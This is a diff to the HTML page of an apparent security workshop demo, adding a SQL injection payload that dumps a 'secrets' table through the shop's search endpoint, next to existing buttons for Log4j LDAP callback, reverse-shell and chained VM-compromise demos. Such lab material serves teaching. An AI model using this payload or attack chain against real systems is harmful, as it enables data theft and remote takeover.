@@ -48,7 +48,10 @@
     <section class="card-ish" style="margin-top:1.25rem">
       <p class="badge">Step 1 · CWE-89</p>
       <h2>SQL injection</h2>
-      <p>UNION SELECT against the SQLite catalog dumps workshop secrets.</p>
+      <p>
+        UNION SELECT against the SQLite catalog dumps workshop secrets.
+        PoC replays the real <code>GET /search?q=…</code> shop request (same path as typing it in the UI).
+      </p>
       <div class="row">
         <button id="run-sqli" type="button">Run SQLi</button>
       </div>
@@ -83,6 +86,8 @@
   </main>
 
   <script>
+    const SQLI_PAYLOAD = "' UNION SELECT id,k,v,v FROM secrets--";
+
     async function postJson(url, resultId) {
       const el = document.getElementById(resultId);
       el.hidden = false;
@@ -96,8 +101,33 @@
       }
     }
 
-    document.getElementById('run-sqli').addEventListener('click', () => {
-      postJson("/api/demo/sqli", "sqli-result");
+    // Same HTTP as typing SQLi into the shop search box (client → GET /search?q=…).
+    async function replayShopSqli() {
+      const url = "/search?q=" + encodeURIComponent(SQLI_PAYLOAD);
+      await fetch(url, {
+        method: "GET",
+        headers: { "Accept": "text/html" },
+        credentials: "same-origin",
+      });
+      return url;
+    }
+
+    document.getElementById('run-sqli').addEventListener('click', async () => {
+      const el = document.getElementById('sqli-result');
+      el.hidden = false;
+      el.textContent = 'Running…';
+      try {
+        const shopUrl = await replayShopSqli();
+        const res = await fetch(
+          "/api/demo/sqli?payload=" + encodeURIComponent(SQLI_PAYLOAD),
+          { method: "POST" }
+        );
+        const data = await res.json();
+        data.browser_http = shopUrl;
+        el.textContent = JSON.stringify(data, null, 2);
+      } catch (err) {
+        el.textContent = String(err);
+      }
     });
     document.getElementById('run-log4j').addEventListener('click', () => {
       const ldap = document.getElementById('ldap').value.trim();
@@ -107,13 +137,24 @@
       const c2 = document.getElementById('c2').value.trim();
       postJson("/api/demo/reverse-shell?callback=" + encodeURIComponent(c2), "rev-result");
     });
-    document.getElementById('run-chain').addEventListener('click', () => {
-      const ldap = document.getElementById('ldap').value.trim();
-      const c2 = document.getElementById('c2').value.trim();
-      const url = "/api/demo/critical-vm-compromise"
-        + "?ldap_callback=" + encodeURIComponent(ldap)
-        + "&c2_callback=" + encodeURIComponent(c2);
-      postJson(url, "chain-result");
+    document.getElementById('run-chain').addEventListener('click', async () => {
+      const el = document.getElementById('chain-result');
+      el.hidden = false;
+      el.textContent = 'Running…';
+      try {
+        await replayShopSqli();
+        const ldap = document.getElementById('ldap').value.trim();
+        const c2 = document.getElementById('c2').value.trim();
+        const url = "/api/demo/critical-vm-compromise"
+          + "?ldap_callback=" + encodeURIComponent(ldap)
+          + "&c2_callback=" + encodeURIComponent(c2);
+        const res = await fetch(url, { method: "POST" });
+        const data = await res.json();
+        data.browser_sqli_http = "/search?q=" + encodeURIComponent(SQLI_PAYLOAD);
+        el.textContent = JSON.stringify(data, null, 2);
+      } catch (err) {
+        el.textContent = String(err);
+      }
     });
   </script>
 </body>
